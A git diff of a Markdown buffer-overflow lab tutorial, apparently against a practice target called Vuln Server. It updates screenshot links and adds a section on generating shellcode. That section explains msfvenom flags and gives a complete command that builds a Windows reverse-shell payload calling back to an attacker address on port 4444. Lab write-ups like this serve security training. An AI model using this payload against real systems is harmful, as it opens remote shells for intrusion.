@@ -739,19 +739,19 @@ except:
        
     - **And then execute the script in Kali:**
 
-        - ![image](https://user-images.githubusercontent.com/94720207/169416805-ed3e64f1-7286-4e04-a5b4-71c69aed4a4b.png)
+        - ![image](https://user-images.githubusercontent.com/94720207/169602307-af75ce7d-db2b-43f0-980c-c316342cc815.png)
     
     - It crashes instantly again, and it shows the message **`Breakpoint at essfunc.625011AF`**
     
-        - ![image](https://user-images.githubusercontent.com/94720207/169417565-18094b0e-83b8-4158-a5d7-db0fc2dd4f2f.png)
+        - ![image](https://user-images.githubusercontent.com/94720207/169602362-02baf264-281b-46bd-90da-79071b9e7b73.png)
 
-    - And the program (Vuln Server) is now paused:
+    - And the program (Chat Server) is now paused:
     
         - ![image](https://user-images.githubusercontent.com/94720207/169418035-8263d336-6e30-47e8-8090-7423ba6ed2e4.png)
 
     - **We have hit our `breakpoint` that means we `control this EIP`!!!** :D
     
-        - ![image](https://user-images.githubusercontent.com/94720207/169418355-82a7ff51-b8d5-4cb7-8210-b7875b13dde1.png)
+        - ![image](https://user-images.githubusercontent.com/94720207/169602571-224895f2-3245-402a-80f9-1b8178b41558.png)
     
     - **We control the `EIP`! and now the only thing to do is generate a `shellcode` to gain a `root shell`**
 
@@ -759,6 +759,29 @@ except:
 
 ### Generating and Gaining Shells
 
+- We going to use `msfvenom` by `metasploit` to generate a payload
+
+- Just like all the payloads generated in `msfvenom`, but I will mention this specific flags:
+
+    - `-p windows/shell_reverse_tcp` = type of shell/payload
+    - `LHOST` & `LPORT` = LOCAL>Attacker (Kali)
+    - ![image](https://user-images.githubusercontent.com/94720207/169419352-75669845-c6a1-458f-be9a-25a409d2241c.png)
+    - `EXITFUNC=thread` =  More stable shell
+    - `-f c` = File type C (C language)
+    - `-a x86` = Architecture x86
+    
+    - **`-b "\x00"` bad characters!!!** 
+
+        - Remeber, Vuln Server does not have `badchars` so, in this case, we only will use x00 Null Byte as a badchar.
+        - Otherwise, add the other `badchar` here!
+    
+    - **Command:**
+    
+    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`**
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169429642-6103e5bd-18e1-47c2-bebe-0a5f333a471a.png)
+
+    - **BOOM!!! We just have generated `THE SHELLCODE` (++++ [in nomine dei nostri excelsi](https://youtu.be/j3_ew_pvPXE?t=292) ++++)
 
 
 
